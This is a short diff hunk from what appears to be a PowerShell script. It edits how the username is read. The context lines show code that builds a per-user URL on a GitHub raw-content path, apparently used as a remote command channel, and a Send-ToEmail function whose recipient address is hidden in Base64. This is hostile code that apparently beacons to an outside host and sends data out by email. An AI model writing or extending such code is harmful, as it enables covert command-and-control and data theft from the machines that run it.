@@ -25,7 +25,7 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
         [int]$_.Exception.Response.StatusCode
     }
 }
-$name = whoami
+$name = $env:username
 $url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
 $receiver=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("eABlAGwAaQBsAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA="))
 $statusCode = Get-UrlStatusCode $url
